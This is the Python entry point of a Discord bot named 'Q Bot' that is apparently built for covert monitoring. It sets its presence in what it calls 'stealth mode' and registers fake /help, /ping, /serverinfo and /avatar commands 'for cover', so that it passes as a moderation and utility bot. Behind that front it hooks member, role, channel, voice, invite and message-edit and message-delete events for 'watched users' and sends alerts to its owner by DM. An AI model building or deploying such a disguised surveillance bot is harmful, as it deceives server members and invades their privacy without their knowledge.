# bot.py — ULTIMATE Q Bot Main Entry Point
import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os

from config import *
from logger import logger
import commands as dm_commands
import monitors
import mask
from dm_notify import alert_simple

# ============= BOT SETUP =============
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.moderation = True
intents.voice_states = True
intents.invites = True

bot = commands.Bot(command_prefix=None, intents=intents, help_command=None)

# ============= STARTUP EVENT =============
@bot.event
async def on_ready():
    """Bot ready event"""
    logger.info(f'Q Bot logged in as {bot.user} (ID: {bot.user.id})')
    logger.info(f'Connected to {len(bot.guilds)} guild(s)')
    
    # Set bot presence (stealth mode)
    try:
        if BOT_ACTIVITY_TYPE == 'watching':
            activity = discord.Activity(type=discord.ActivityType.watching, name=BOT_STATUS)
        elif BOT_ACTIVITY_TYPE == 'playing':
            activity = discord.Activity(type=discord.ActivityType.playing, name=BOT_STATUS)
        elif BOT_ACTIVITY_TYPE == 'listening':
            activity = discord.Activity(type=discord.ActivityType.listening, name=BOT_STATUS)
        else:
            activity = None
        
        await bot.change_presence(activity=activity, status=discord.Status.online)
        logger.info(f'Bot presence set: {BOT_STATUS}')
    except Exception as e:
        logger.exception(f'Failed to set presence: {e}')
    
    # Register slash commands
    try:
        if GUILD_ID is not None:
            await _register_slash_commands()
        else:
            logger.info('GUILD_ID not set - skipping slash command registration')
    except Exception as e:
        logger.exception(f'Failed to register slash commands: {e}')
    
    # Cache invites for tracking
    if GUILD_ID:
        guild = bot.get_guild(GUILD_ID)
        if guild:
            await monitors.cache_invites(guild)
    
    # Send startup notification to owner
    if OWNER_ID and DM_ALERTS:
        try:
            await alert_simple(bot, f'✅ **Q Bot Started**\n**Name:** {BOT_NAME}\n**Guilds:** {len(bot.guilds)}\n**Status:** Online')
        except:
            pass
    
    logger.info('='*60)
    logger.info('Q Bot is fully operational!')
    logger.info('='*60)

async def _register_slash_commands():
    """Register slash commands (real and fake)"""
    guild = discord.Object(id=GUILD_ID)
    
    # Real command: set mask channel (owner only)
    @app_commands.command(name='set-auto-reply', description='⚙️ Configure auto-reply channel')
    @app_commands.describe(channel='Channel where bot will auto-reply to every message')
    async def set_auto_reply(interaction: discord.Interaction, channel: discord.TextChannel):
        """Set auto-reply channel (owner only)"""
        if OWNER_ID is None or interaction.user.id != OWNER_ID:
            await interaction.response.send_message('❌ Owner only command', ephemeral=True)
            return
        
        from mask import set_mask_channel_by_id
        set_mask_channel_by_id(channel.id)
        
        await interaction.response.send_message(
            f'✅ Auto-reply enabled in {channel.mention}',
            ephemeral=True
        )
        logger.info(f'Auto-reply channel set to {channel.id} by {interaction.user}')
    
    bot.tree.add_command(set_auto_reply, guild=guild)
    
    # Fake commands (for cover)
    if ENABLE_FAKE_COMMANDS:
        # Fake help command
        @app_commands.command(name='help', description='📖 Show bot commands and features')
        async def fake_help(interaction: discord.Interaction):
            """Fake help command"""
            help_embed = discord.Embed(
                title=f"📖 {BOT_NAME} - Help",
                description=f"{BOT_NAME} is a moderation and utility bot designed to help manage your server.",
                color=discord.Color.blue()
            )
            
            help_embed.add_field(
                name="⚙️ Commands",
                value=(
                    "`/help` - Show this help message\n"
                    "`/ping` - Check bot latency\n"
                    "`/serverinfo` - Show server information\n"
                    "`/avatar` - Display user's avatar"
                ),
                inline=False
            )
            
            help_embed.add_field(
                name="🛡️ Features",
                value="• Auto-moderation\n• Server logging\n• Utility commands",
                inline=False
            )
            
            help_embed.set_footer(text=f"{BOT_NAME} Bot")
            
            await interaction.response.send_message(embed=help_embed, ephemeral=True)
        
        bot.tree.add_command(fake_help, guild=guild)
        
        # Fake ping command
        @app_commands.command(name='ping', description='🏓 Check bot latency')
        async def fake_ping(interaction: discord.Interaction):
            """Fake ping command"""
            latency = round(bot.latency * 1000)
            
            embed = discord.Embed(
                title="🏓 Pong!",
                description=f"Bot latency: **{latency}ms**",
                color=discord.Color.green()
            )
            
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        bot.tree.add_command(fake_ping, guild=guild)
        
        # Fake serverinfo command
        @app_commands.command(name='serverinfo', description='ℹ️ Display server information')
        async def fake_serverinfo(interaction: discord.Interaction):
            """Fake serverinfo command"""
            guild = interaction.guild
            
            embed = discord.Embed(
                title=f"ℹ️ {guild.name}",
                color=discord.Color.blue()
            )
            
            embed.add_field(name="👥 Members", value=str(guild.member_count), inline=True)
            embed.add_field(name="📁 Channels", value=str(len(guild.channels)), inline=True)
            embed.add_field(name="🎭 Roles", value=str(len(guild.roles)), inline=True)
            embed.add_field(name="📅 Created", value=guild.created_at.strftime('%Y-%m-%d'), inline=True)
            embed.add_field(name="👑 Owner", value=str(guild.owner), inline=True)
            
            if guild.icon:
                embed.set_thumbnail(url=guild.icon.url)
            
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        bot.tree.add_command(fake_serverinfo, guild=guild)
        
        # Fake avatar command
        @app_commands.command(name='avatar', description='🖼️ Display a user\'s avatar')
        @app_commands.describe(user='User to show avatar of (leave empty for yourself)')
        async def fake_avatar(interaction: discord.Interaction, user: discord.Member = None):
            """Fake avatar command"""
            target = user or interaction.user
            
            embed = discord.Embed(
                title=f"🖼️ {target.display_name}'s Avatar",
                color=discord.Color.blue()
            )
            
            embed.set_image(url=target.display_avatar.url)
            
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        bot.tree.add_command(fake_avatar, guild=guild)
    
    # Sync commands
    await bot.tree.sync(guild=guild)
    logger.info(f'Slash commands registered and synced to guild {GUILD_ID}')

# ============= GUILD JOIN/LEAVE =============
@bot.event
async def on_guild_join(guild: discord.Guild):
    """Handle bot joining a guild"""
    try:
        # If GUILD_ID is set and this is not our guild, leave immediately
        if GUILD_ID is not None and guild.id != GUILD_ID:
            await guild.leave()
            logger.warning(f'Auto-left unauthorized guild: {guild.name} ({guild.id})')
            
            if OWNER_ID and DM_ALERTS:
                await alert_simple(bot, f'⚠️ Bot was added to unauthorized guild and left automatically\n**Guild:** {guild.name} ({guild.id})')
        else:
            logger.info(f'Joined guild: {guild.name} ({guild.id})')
            
            # Cache invites
            await monitors.cache_invites(guild)
            
            if OWNER_ID and DM_ALERTS:
                await alert_simple(bot, f'✅ Bot joined guild\n**Guild:** {guild.name} ({guild.id})\n**Members:** {guild.member_count}')
    except Exception as e:
        logger.exception(f'on_guild_join failed: {e}')

# ============= MESSAGE HANDLING =============
@bot.event
async def on_message(message: discord.Message):
    """Handle messages"""
    # Ignore bot messages
    if message.author.bot:
        return
    
    # Mask behavior (auto-reply)
    try:
        await mask.on_message_mask(bot, message)
    except Exception as e:
        logger.exception(f'Mask handler failed: {e}')
    
    # DM commands (owner only)
    if message.guild is None:
        try:
            await dm_commands.handle_dm(bot, message)
        except Exception as e:
            logger.exception(f'DM command handler failed: {e}')
        return
    
    # No processing for regular server messages
    return

# ============= MEMBER EVENTS =============
@bot.event
async def on_member_join(member: discord.Member):
    """Handle member join"""
    try:
        await monitors.handle_member_join(bot, member)
    except Exception as e:
        logger.exception(f'handle_member_join failed: {e}')

@bot.event
async def on_member_remove(member: discord.Member):
    """Handle member leave"""
    try:
        await monitors.handle_member_remove(bot, member)
    except Exception as e:
        logger.exception(f'handle_member_remove failed: {e}')

@bot.event
async def on_member_update(before: discord.Member, after: discord.Member):
    """Handle member updates"""
    try:
        await monitors.handle_member_update(bot, before, after)
    except Exception as e:
        logger.exception(f'handle_member_update failed: {e}')

# ============= MODERATION EVENTS =============
@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
    """Handle member ban"""
    try:
        await monitors.handle_member_ban(bot, guild, user)
    except Exception as e:
        logger.exception(f'handle_member_ban failed: {e}')

@bot.event
async def on_member_unban(guild: discord.Guild, user: discord.User):
    """Handle member unban"""
    try:
        await monitors.handle_member_unban(bot, guild, user)
    except Exception as e:
        logger.exception(f'handle_member_unban failed: {e}')

# ============= CHANNEL EVENTS =============
@bot.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel):
    """Handle channel creation"""
    try:
        await monitors.handle_channel_create(bot, channel)
    except Exception as e:
        logger.exception(f'handle_channel_create failed: {e}')

@bot.event
async def on_guild_channel_delete(channel: discord.abc.GuildChannel):
    """Handle channel deletion"""
    try:
        await monitors.handle_channel_delete(bot, channel)
    except Exception as e:
        logger.exception(f'handle_channel_delete failed: {e}')

@bot.event
async def on_guild_channel_update(before: discord.abc.GuildChannel, after: discord.abc.GuildChannel):
    """Handle channel update"""
    try:
        await monitors.handle_channel_update(bot, before, after)
    except Exception as e:
        logger.exception(f'handle_channel_update failed: {e}')

# ============= ROLE EVENTS =============
@bot.event
async def on_guild_role_create(role: discord.Role):
    """Handle role creation"""
    try:
        await monitors.handle_guild_role_create(bot, role)
    except Exception as e:
        logger.exception(f'handle_guild_role_create failed: {e}')

@bot.event
async def on_guild_role_delete(role: discord.Role):
    """Handle role deletion"""
    try:
        await monitors.handle_guild_role_delete(bot, role)
    except Exception as e:
        logger.exception(f'handle_guild_role_delete failed: {e}')

@bot.event
async def on_guild_role_update(before: discord.Role, after: discord.Role):
    """Handle role update"""
    try:
        await monitors.handle_guild_role_update(bot, before, after)
    except Exception as e:
        logger.exception(f'handle_guild_role_update failed: {e}')

# ============= MESSAGE TRACKING (Watched users only) =============
@bot.event
async def on_message_delete(message: discord.Message):
    """Handle message deletion"""
    try:
        await monitors.handle_message_delete(bot, message)
    except Exception as e:
        logger.exception(f'handle_message_delete failed: {e}')

@bot.event
async def on_message_edit(before: discord.Message, after: discord.Message):
    """Handle message edit"""
    try:
        await monitors.handle_message_edit(bot, before, after)
    except Exception as e:
        logger.exception(f'handle_message_edit failed: {e}')

# ============= GUILD EVENTS =============
@bot.event
async def on_guild_update(before: discord.Guild, after: discord.Guild):
    """Handle guild settings update"""
    try:
        await monitors.handle_guild_update(bot, before, after)
    except Exception as e:
        logger.exception(f'handle_guild_update failed: {e}')

# ============= VOICE EVENTS =============
@bot.event
async def on_voice_state_update(member: discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    """Handle voice state changes"""
    try:
        await monitors.handle_voice_state_update(bot, member, before, after)
    except Exception as e:
        logger.exception(f'handle_voice_state_update failed: {e}')

# ============= INVITE EVENTS =============
@bot.event
async def on_invite_create(invite: discord.Invite):
    """Handle invite creation"""
    try:
        await monitors.handle_invite_create(bot, invite)
    except Exception as e:
        logger.exception(f'handle_invite_create failed: {e}')

@bot.event
async def on_invite_delete(invite: discord.Invite):
    """Handle invite deletion"""
    try:
        await monitors.handle_invite_delete(bot, invite)
    except Exception as e:
        logger.exception(f'handle_invite_delete failed: {e}')

# ============= ERROR HANDLING =============
@bot.event
async def on_error(event, *args, **kwargs):
    """Handle errors"""
    logger.exception(f'Error in event {event}')

# ============= RUN BOT =============
if __name__ == '__main__':
    if TOKEN is None:
        raise SystemExit('❌ TOKEN not set. Please set it in environment variables.')
    
    try:
        logger.info('Starting Q Bot...')
        bot.run(TOKEN, log_handler=None)
    except KeyboardInterrupt:
        logger.info('Bot stopped by user')
    except Exception as e:
        logger.exception(f'Fatal error: {e}')
        raise
